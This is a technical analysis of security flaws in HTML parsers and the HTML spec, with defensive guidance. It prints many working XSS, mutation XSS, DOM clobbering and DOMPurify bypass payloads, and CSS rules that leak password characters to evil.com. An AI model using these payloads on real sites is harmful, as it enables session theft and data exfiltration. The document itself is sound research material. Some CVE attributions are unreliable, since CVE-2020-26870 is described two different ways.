# HTML Security Analysis: Specification & Parser-Level Vulnerabilities

> **Analysis Target**: HTML Living Standard (WHATWG), Browser Parser Implementations (Blink, Gecko, WebKit)
> **Methodology**: Direct extraction of security implications from WHATWG spec text → Browser parser differential analysis → Attack vector mapping
> **Scope**: Focused on spec/parser design-level vulnerabilities in HTML parsing, DOM manipulation, and sanitization bypasses

---

## 1. Executive Summary

The root causes of HTML security issues are **parser complexity** and **specification ambiguity**.

**Key Findings**:
- The WHATWG HTML Living Standard tokenizer has 80+ states; ambiguities in state transitions create parser differentials
- SVG/MathML foreign content integration points cause namespace switching inconsistencies between sanitizers and browsers
- innerHTML serialization→reparsing mutates the DOM, bypassing sanitization
- DOM Clobbering—where HTML `id`/`name` attributes overwrite `window`/`document` properties—is spec-defined normal behavior

**Attack Class Taxonomy**:

| Attack Type | Root Cause | Spec Reference |
|-------------|-----------|----------------|
| Mutation XSS (mXSS) | DOM mutation during serialization/reparsing | §13.2.6 Tree Construction |
| DOM Clobbering | Named Access on Window | §7.3.3 Named Access |
| Namespace Confusion | SVG/MathML integration points | §13.2.6.5 Foreign Content |
| Parser Differential | Implementation differences across parsers | §13.2.5 Tokenization |
| Template Injection | Server-side template context confusion | §4.12.1 Script Execution |

---

## 2. Specification Analysis: WHATWG HTML Living Standard

### 2.1 Tokenization State Machine Security Implications (§13.2.5)

HTML tokenization operates as a state machine with 80+ states. The security-critical aspect is **ambiguity in state transitions**.

**Security-Critical State Transitions**:
```
Data State → '<' → Tag Open State → ASCII alpha → Tag Name State
Tag Name State → whitespace → Before Attribute Name State
Before Attribute Name State → non-whitespace → Attribute Name State
```

**Spec Ambiguity #1: NULL Byte Handling**

§13.2.5.1: *"U+0000 NULL: This is an unexpected-null-character parse error. Emit a U+FFFD REPLACEMENT CHARACTER token."*

However, actual browser implementations differ:
- Blink: Treats as string terminator in certain contexts
- Gecko: Replaces with U+FFFD
- WebKit: Context-dependent behavior

This difference led to CVE-2020-6812 (Firefox NULL byte XSS filter bypass).

**Spec Ambiguity #2: EOF in Script Data State**

§13.2.5.6: *"EOF: Emit an end-of-file token."*

Whether incomplete script tags should execute is not clearly defined, creating a root cause for mXSS vulnerabilities.

### 2.2 Tree Construction and Foster Parenting (§13.2.6)

The tree construction phase operates through 23 insertion modes. The security-critical mechanism is **foster parenting**.

§13.2.6.1: When improper content appears inside table elements, the parser moves nodes outside the table:

```html
<table><script>alert(1)</script></table>
```

Foster parenting can cause the script to execute before the table is constructed.

### 2.3 Foreign Content Integration Points (§13.2.6.5)

When SVG/MathML is integrated into an HTML document, parsing rules switch. The spec does not clearly define attribute handling, causing namespace confusion:

```html
<svg><script href="data:,alert(1)"></script></svg>
```

SVG `<script>`'s `href` behaves differently from HTML `<script>`'s `src`.

### 2.4 innerHTML Security Boundary (§8.2)

Spec §8.2.1: *"There are no security implications beyond those of allowing arbitrary content to be rendered (e.g., there is no script execution during parsing)."*

**This statement is misleading.** Script tags don't execute, but:
1. Event handlers (`onerror`, `onload`, etc.) do execute
2. Scripts inside SVG/MathML do execute
3. DOM Clobbering occurs via `id`/`name` attributes

```html
<div id="target"></div>
<script>
  target.innerHTML = '<script>alert(1)</script>';     // Does NOT execute
  target.innerHTML = '<img src=x onerror=alert(1)>';  // Executes!
  target.innerHTML = '<svg><script>alert(1)</script></svg>'; // Executes!
</script>
```

### 2.5 Event Handler Attributes (§6.1.7.2)

The spec defines that event handler content attributes execute JavaScript, but **provides no guidance on which event handlers should be restricted in sanitization contexts**.

Commonly abused event handlers:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details ontoggle=alert(1) open>
<marquee onstart=alert(1)>
<video onloadstart=alert(1)><source src=x>
```

### 2.6 Other Spec Ambiguities

**Comment Parsing (§13.2.5.44)**: Handling of conditional comments and nested comments varies across browsers:
```html
<!--[if IE]><script>alert(1)</script><![endif]-->
<!-- Nested <!-- comment --> handling varies -->
```

**CDATA Sections (§13.2.6.5)**: CDATA is valid only in SVG/MathML, but some parsers accept it in HTML context, enabling sanitizer bypasses:
```html
<![CDATA[<script>alert(1)</script>]]>
```

**Character Encoding Detection (§4.2.5)**: Priority ambiguity in the BOM → HTTP Content-Type → meta charset order enables encoding confusion attacks.

**Form Element Reassociation (§4.10.3)**: The `form` attribute allows form association regardless of tree position, forming the basis for DOM Clobbering:
```html
<form id="f1"></form>
<input form="f1" name="action" value="evil.php">
<script>
  console.log(f1.action); // Returns the input element, not the form action!
</script>
```

---

## 3. Browser Parser Differentials

Parser implementation differences across Blink, Gecko, and WebKit are the core cause of sanitizer bypasses.

### 3.1 Blink (Chrome/Edge)

**Parser location**: `third_party/blink/renderer/core/html/parser/`

**Preload Scanner Differential**: Blink uses a preload scanner that discovers resources ahead of the main parser, creating timing differentials:
```html
<div>
  <img src=1>
  <script>document.write('<img src=2>');</script>
  <img src=3>
</div>
```
The preload scanner discovers `src=1` and `src=3` before script execution, but `src=2` only after.

**Foster Parenting Edge Cases**: When foreign content combines with nested tables, subtle differences from the spec emerge:
```html
<table><tr><td><svg><desc><table><tr><td><img src=x onerror=alert(1)>
```

### 3.2 Gecko (Firefox)

**Parser location**: `parser/html/`

**NULL Byte Handling**: In CVE-2020-6812, Gecko's URL parser treated `%00` as a string terminator while the HTML parser continued, creating an inconsistency:
```html
<a href="javascript:alert(1)%00.jpg">Click</a>
```

**Foreign Content Namespace**: Gecko handles SVG/MathML namespaces more strictly. Parsing differs based on whether `<style>` is treated as an SVG or HTML element:
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```

### 3.3 WebKit (Safari)

**Parser location**: `Source/WebCore/html/parser/`

**Quirks Mode Differential**: WebKit has unique quirks mode behavior:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Triggers quirks mode in WebKit but limited quirks in other engines -->
```
Quirks mode affects CSS parsing, box model, hash navigation, and form submission.

**Template Element Edge Cases**: WebKit's `<template>` implementation differs in script execution behavior:
```html
<template><script>alert(1)</script></template>
<script>
  document.body.appendChild(template.content.cloneNode(true));
  // Execution behavior varies across browsers
</script>
```

### 3.4 Quirks Mode Security Impact

Missing or legacy DOCTYPE declarations trigger quirks mode:

1. **Hash Fragment**: Quirks mode hash navigation behaved differently, creating historical XSS possibilities
2. **Relaxed CSS Parsing**: `expression()` (IE) and relaxed CSS parsing affect CSP style-src
3. **Form Encoding Differences**: Quirks mode form encoding variations create injection vectors

---

## 4. Attack Techniques

### 4.1 Mutation XSS (mXSS)

DOM mutates when HTML is serialized and reparsed, bypassing sanitization.

**Mechanism**: Sanitizer parses DOM → serializes via `innerHTML` → browser reparses. If tag boundaries shift during this process, the payload activates.

**Representative Patterns**:

`<noscript>` mutation:
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```
The sanitizer (scripts enabled) sees `<noscript>` content as inert, but on reparsing `</noscript>` closes and the img executes.

`<style>` mutation:
```html
<style><style></style><script>alert(1)</script></style>
```

SVG mutation:
```html
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
```

Foreign content mutation:
```html
<math><annotation-xml encoding="text/html">
  <style><img src=x onerror=alert(1)></style>
</annotation-xml></math>
```

### 4.2 DOM Clobbering

HTML `id`/`name` attributes overwrite `window`/`document` properties—this is **spec-defined normal behavior** (§7.3.3 Named Access on Window).

**Basic Clobbering**:
```html
<form id="config"></form>
<script>
  console.log(window.config); // Returns the form element, not the app config!
</script>
```

**Nested Clobbering** (property chain attack):
```html
<form id="config">
  <input name="apiUrl" value="http://evil.com/api">
</form>
<script>
  fetch(config.apiUrl); // Element converts to string, fetches from evil.com
</script>
```

**HTMLCollection Clobbering**:
```html
<a id="test"></a><a id="test"></a>
<script>
  console.log(test);        // Returns HTMLCollection
  console.log(test.length); // 2
</script>
```

**Real-World Cases**:
- **Google reCAPTCHA bypass (2019)**: `<form id="g-recaptcha-response" name="g-recaptcha-response">` — clobbered the window property referenced by reCAPTCHA code
- **DOMPurify bypass (CVE-2020-26870)**: Clobbered the sanitization config object to alter behavior
- **CDN takeover**: `<a id="cdn" href="http://evil.com/malicious.js">` — clobbered the fallback URL path

### 4.3 Namespace Confusion (SVG/MathML)

Security issues arise at **integration points** where parsing rules switch when SVG/MathML is embedded in HTML.

**SVG-based XSS**:
```html
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><script href="data:,alert(1)"></script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><foreignObject><body onload=alert(1)></foreignObject>
```

**MathML-based XSS**:
```html
<math><mtext><script>alert(1)</script></mtext></math>
<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>
```

`<foreignObject>` and `<annotation-xml encoding="text/html">` create HTML integration points where HTML parsing resumes.

### 4.4 Parser Differential Attacks

Exploits implementation differences between sanitizer and browser parsers.

**Comment differential**:
```html
<!--><script>alert(1)</script><!---->
```
DOMPurify sees a comment; the browser may execute the script.

**Attribute parsing differential**:
```html
<img src=x onerror=alert(1) /onclick=alert(2)>
```
A sanitizer may parse one attribute; a browser may parse two.

**Case variation**:
```html
<ScRiPt>alert(1)</sCrIpT>
```

**Whitespace injection**:
```html
<script
>alert(1)</script>
<img src=x onerror
=alert(1)>
```

**Encoding differential**:
```html
<img src=x on&#9;error=alert(1)>
```
Some sanitizers decode entities before checking attribute names; browsers decode after.

### 4.5 Prototype Pollution via HTML

Prototype pollution through HTML form elements:
```html
<form id="user">
  <input name="__proto__">
  <input name="isAdmin" value="true">
</form>
<script>
  const userData = {};
  for (let input of document.getElementById('user').elements) {
    userData[input.name] = input.value;
  }
  // Object.prototype.isAdmin is now "true"
  const newUser = {};
  console.log(newUser.isAdmin); // "true"
</script>
```

### 4.6 Data URI / Blob URL Attacks

```html
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
<object data="data:text/html,<script>alert(1)</script>"></object>
```

### 4.7 Meta Tag Injection

```html
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

CSP meta tag conflict:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'none'">
<meta http-equiv="Content-Security-Policy" content="default-src *">
```

### 4.8 CSS Injection

**Data exfiltration via CSS selectors**:
```css
input[name="password"][value^="a"] { background: url(https://evil.com/log?char=a); }
input[name="password"][value^="b"] { background: url(https://evil.com/log?char=b); }
```

**Legacy CSS XSS** (IE):
```css
body { background: expression(alert(1)); }
```

### 4.9 Character Encoding Bypasses

**UTF-7 XSS** (CVE-2008-2382, IE):
```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```
If the page is interpreted as UTF-7, this becomes `<script>alert(1)</script>`. Defense: explicitly set `<meta charset="UTF-8">`.

**Entity encoding bypass**:
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=al&#101;rt(1)>
```

---

## 5. DOMPurify Bypass Case Studies

DOMPurify is the most widely used HTML sanitization library, yet bypasses are discovered repeatedly.

### CVE-2024-45801 — MathML/SVG Nested mXSS

```html
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
```
**Cause**: Failed to track deeply nested MathML/SVG/HTML context switches. **Fix**: DOMPurify 3.1.7.

### CVE-2024-47875 — Config Override via DOM Clobbering

```html
<form id="sanitizeOptions">
  <input name="ALLOWED_TAGS">
  <input name="KEEP_CONTENT" value="true">
</form>
```
**Cause**: Sanitization options stored in window properties were clobberable. **Fix**: DOMPurify 3.1.8 (frozen config).

### CVE-2020-26870 — noembed/style Mutation XSS

```html
<noembed><style></noembed><img src=x onerror=alert(1)></style></noembed>
```
**Cause**: Serialization/reparsing mutation when noembed/style elements nest. **Fix**: DOMPurify 2.2.1.

### CVE-2019-20374 — Foreign Content mXSS

```html
<annotation-xml encoding="text/html"><div><svg></p><style><a title="</style><img src=x onerror=alert(1)>"></annotation-xml>
```
**Cause**: MathML annotation-xml with text/html encoding creates an HTML integration point with complex parsing. **Fix**: DOMPurify 2.0.8.

### CVE-2019-16728 — Template/Form Clobbering

```html
<form><template><form><input name="action"><input name="method"></template></form>
```
**Cause**: Form properties clobbered inside template content. **Fix**: DOMPurify 2.0.1.

**Pattern Analysis**: Most DOMPurify bypasses converge on three patterns: (1) foreign content integration points, (2) serialization/reparsing mutation, (3) DOM Clobbering.

---

## 6. Browser Security Features

### 6.1 Trusted Types API

A browser API that prevents DOM XSS by requiring typed values for dangerous sinks.

**Support**: Chrome/Edge 83+. Firefox: under consideration. Safari: not supported.

```javascript
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: (input) => DOMPurify.sanitize(input)
});
element.innerHTML = policy.createHTML(userInput);
```

**CSP enforcement**:
```http
Content-Security-Policy: require-trusted-types-for 'script'
```

**Protected sinks**: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `DOMParser.parseFromString`, `eval()`, `setTimeout()/setInterval()` (string), `Function()` constructor, etc.

### 6.2 HTML Sanitizer API

Browser-native HTML sanitization (W3C Draft). **Parser-aware, so mXSS is structurally eliminated.**

**Status**: Chrome Origin Trial (105+). Firefox/Safari: in development / not implemented.

```javascript
const sanitizer = new Sanitizer({
  allowElements: ['div', 'span', 'p', 'b', 'i'],
  blockElements: ['script', 'style'],
  dropAttributes: { 'onclick': ['*'], 'onerror': ['*'] }
});
element.setHTML(userInput, {sanitizer});
```

### 6.3 Content Security Policy (CSP)

Controls resource loading and script execution to mitigate XSS.

**Recommended configuration (CSP Level 3)**:
```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{random}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script'
```

**Key bypass patterns**:

| Bypass Type | Condition | Example |
|-------------|-----------|---------|
| JSONP Endpoint | JSONP exists on trusted domain | `<script src="https://trusted.com/jsonp?callback=alert(1)">` |
| Base Tag Injection | `base-uri` not set | `<base href="https://evil.com/">` → hijacks relative script paths |
| Angular Template | AngularJS allowed | `{{constructor.constructor('alert(1)')()}}` |
| strict-dynamic propagation | Nonce script creates dynamic scripts | Child scripts created by valid-nonce scripts also execute |

### 6.4 Subresource Integrity (SRI)

Detects tampering of external resources:
```html
<script src="https://cdn.example.com/library.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/..."
        crossorigin="anonymous"></script>
```

**Limitations**: Requires CORS, protects only external resources, ineffective against CDN compromise before hash generation.

### 6.5 SameSite Cookies

Cookie attribute that mitigates CSRF:

| Value | Behavior | Default? |
|-------|----------|----------|
| `Strict` | Sent only for same-site requests | |
| `Lax` | Sent for top-level GET navigation | Chrome 80+ default |
| `None` | Sent for all requests (Secure required) | |

**Known bypasses**:
- Lax+POST: Chrome sends Lax cookies with POST for 2 minutes after cookie creation
- WebSocket: SameSite not enforced (`new WebSocket('wss://bank.com/socket')`)

### 6.6 document.domain Deprecation

`document.domain`, which relaxed same-origin policy across subdomains, has been deprecated:
- Chrome 109+ (2023.02): Disabled by default
- Firefox 103+ (2022.07): Disabled by default

Replacement: `postMessage()` API, `Origin-Agent-Cluster: ?1` header.

---

## 7. Attack-Spec-Defense Mapping

| Attack Type | Exploited Spec Behavior | Spec Reference | Defense |
|-------------|------------------------|----------------|---------|
| mXSS | DOM mutation during serialization/reparsing | §13.2.6 | Trusted Types, Sanitizer API, latest DOMPurify |
| DOM Clobbering | Named Access on Window | §7.3.3 | Avoid bare `window.` property access, Object.freeze |
| Namespace Confusion | SVG/MathML integration points | §13.2.6.5 | Strip foreign content or use allowlist sanitization |
| innerHTML XSS | Event handler execution | §8.2, §6.1.7.2 | Enforce Trusted Types, minimize innerHTML usage |
| Parser Differential | Parser implementation differences | §13.2.5 | Browser-native Sanitizer API (guarantees parser match) |
| CSS Injection | Selector-based data exfiltration | CSS Selectors L4 | CSP style-src 'nonce-...' |
| Data URI XSS | data: allowed in iframe/object src | §4.8.5 | CSP frame-src restriction, block data: |
| Template Injection | Server-side HTML generation | §4.12.1 | Context-aware output encoding, auto-escaping templates |
| Prototype Pollution | Object contamination via form elements | §4.10 | Object.create(null), use Map, input validation |
| Encoding Bypass | Character encoding ambiguity | §4.2.5 | Explicit charset=UTF-8, X-Content-Type-Options: nosniff |

---

## 8. References

### Specifications
1. [WHATWG HTML Living Standard](https://html.spec.whatwg.org/) — §13.2 Parsing, §4.12.1 Script execution, §7.3.3 Named access
2. [W3C Trusted Types Specification](https://w3c.github.io/trusted-types/dist/spec/)
3. [W3C HTML Sanitizer API](https://wicg.github.io/sanitizer-api/)
4. [W3C Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)
5. [W3C Subresource Integrity](https://www.w3.org/TR/SRI/)

### Browser Source Code
6. [Blink HTML Parser](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/html/parser/)
7. [Gecko HTML Parser](https://searchfox.org/mozilla-central/source/parser/html)

### Security Research
8. [PortSwigger Web Security Research](https://portswigger.net/research) — DOM XSS, mXSS, parser differentials
9. [Cure53 Security Research](https://cure53.de/#publications) — DOMPurify development and audits
10. [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
11. [OWASP DOM Based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

### Tools
12. [DOMPurify](https://github.com/cure53/DOMPurify)
13. [HTML5 Security Cheatsheet](https://html5sec.org/)
14. [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

### Academic Papers
15. Mario Heiderich et al., "mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations" (2013)
16. Sebastian Lekies et al., "Code-Reuse Attacks for the Web: Breaking XSS Mitigations via Script Gadgets" (2017)
